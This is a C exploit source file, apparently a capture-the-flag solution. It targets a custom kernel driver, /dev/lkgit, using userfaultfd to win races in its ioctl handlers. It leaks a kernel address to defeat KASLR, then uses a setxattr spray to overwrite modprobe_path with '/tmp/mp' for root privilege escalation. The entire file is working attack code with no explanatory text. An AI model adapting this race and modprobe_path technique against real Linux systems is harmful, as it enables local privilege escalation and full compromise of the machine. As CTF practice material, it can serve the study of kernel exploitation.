// gcc exploit.c -masm=intel -fno-PIE -no-pie -lpthread -o exploit
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>
#include <sys/shm.h>
#include "lkgit.h"

#define container_of(ptr, type, member) ({          \
    const typeof( ((type *)0)->member ) *__mptr = (ptr);    \
    (type *)( (char *)__mptr - offsetof(type,member) );})

#define CONTENT "CONTENT"

static void dump(void *buf, size_t size);

/* exploit */
#define BASE			0xffffffff81000000
#define OFFSET(addr)	((addr) - (BASE))
#define ADDR(offset)	(kernel_base + (offset))

uint64_t kernel_base				= 0;
uint64_t ofs_icp_namespace			= OFFSET(0xffffffff81d6e800);
uint64_t ofs_modprobe_path			= OFFSET(0xffffffff81c3cb20);

static int init_uffd(void *region, size_t size, void *(*handler)(void*));
static void *uffd_handler(void *arg);

static char* commit(char *content, char *message);
static log_object* checkout(char *hash);
static int checkout_req(log_object* req);
static int amend_req(log_object* req);

void *base_page;
int lkgit_fd;
int shmid, count = 0;
hash_object attr_buf;

int main(void){
	if((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1)
		return -1;

	if((lkgit_fd = open("/dev/lkgit", O_RDWR)) < 0)
		return -1;

	char *hash = commit((char[FILE_MAXSZ]){CONTENT}, "first");

	base_page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
	void *fault_page = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	init_uffd(fault_page+0x1000, 0x1000, uffd_handler);

	log_object *req = container_of(fault_page + 0x1000, log_object, message);
	memcpy(req->hash, hash, HASH_SIZE);
	checkout_req(req);

	uint64_t addr_icp_namespace = ((uint64_t*)req)[1];
	kernel_base = addr_icp_namespace - ofs_icp_namespace;
	printf("[+] kernel_base: %lx\n", kernel_base);

	memcpy(req->hash, hash, HASH_SIZE);
	madvise((void*)fault_page+0x1000, 0x1000, MADV_DONTNEED);

	attr_buf.message = (void*)ADDR(ofs_modprobe_path);
	strcpy(base_page, "/tmp/mp");

	amend_req(req);
}

static char* commit(char *content, char *message) {
	hash_object req = {
		.content = content,
		.message = message,
	};

	if(ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &req))
		return NULL;

	char *hash = malloc(HASH_SIZE);
	memcpy(hash, req.hash, HASH_SIZE);

	return hash;
}

/*
log_object* checkout(char *hash) {
	log_object *req = malloc(sizeof(log_object));
	memcpy(req->hash, hash, HASH_SIZE);

	if(ioctl(lkgit_fd, LKGIT_GET_OBJECT, req))
		return NULL;
	return req;
}

int amend(char *hash, char *message) {
	log_object req = {};
	memcpy(req.hash, hash, HASH_SIZE);
	memcpy(req.message, message, MESSAGE_MAXSZ);

	if(ioctl(lkgit_fd, LKGIT_AMEND_MESSAGE, req))
		return -1;
	return 0;
}
*/

static int checkout_req(log_object* req) {
	if(ioctl(lkgit_fd, LKGIT_GET_OBJECT, req))
		return -1;
	return 0;
}

static int amend_req(log_object* req) {
	if(ioctl(lkgit_fd, LKGIT_AMEND_MESSAGE, req))
		return -1;
	return 0;
}

static int init_uffd(void *region, size_t size, void *(*handler)(void*)){
	int uffd;
	struct uffdio_api uffdio_api = {
		.api = UFFD_API,
		.features = 0
	};
	struct uffdio_register uffdio_register = {
		.mode = UFFDIO_REGISTER_MODE_MISSING,
		.range = {
			.start = (uint64_t)region,
			.len = size
		}
	};
	pthread_t th;

	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ioctl(uffd, UFFDIO_API, &uffdio_api);
	ioctl(uffd, UFFDIO_REGISTER, &uffdio_register);

	pthread_create(&th, NULL, handler, (void*)uffd);
}

static void *uffd_handler(void *arg){
	int uffd = (int)arg;

	for (;;) {
		struct pollfd pollfd = {
			.fd = uffd,
			.events = POLLIN
		};
		struct uffd_msg msg;

		poll(&pollfd, 1, -1);

		read(uffd, &msg, sizeof(msg));
		if (msg.event & UFFD_EVENT_PAGEFAULT) {
			struct uffdio_copy copy = {
				.src = (uint64_t)base_page,
				.dst = (uint64_t)msg.arg.pagefault.address & ~0xfff,
				.len = 0x1000,
				.mode = 0,
				.copy = 0,
			};

			puts("uffd!");
			commit((char[FILE_MAXSZ]){CONTENT}, "dup");

			switch(count++){
				case 0:
					shmat(shmid, NULL, 0);
					break;
				case 1:
					setxattr("/tmp", "x", &attr_buf, 0x20, XATTR_CREATE);
					break;
			}

			ioctl(uffd, UFFDIO_COPY, &copy);
		}
	}
	return NULL;
}

static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
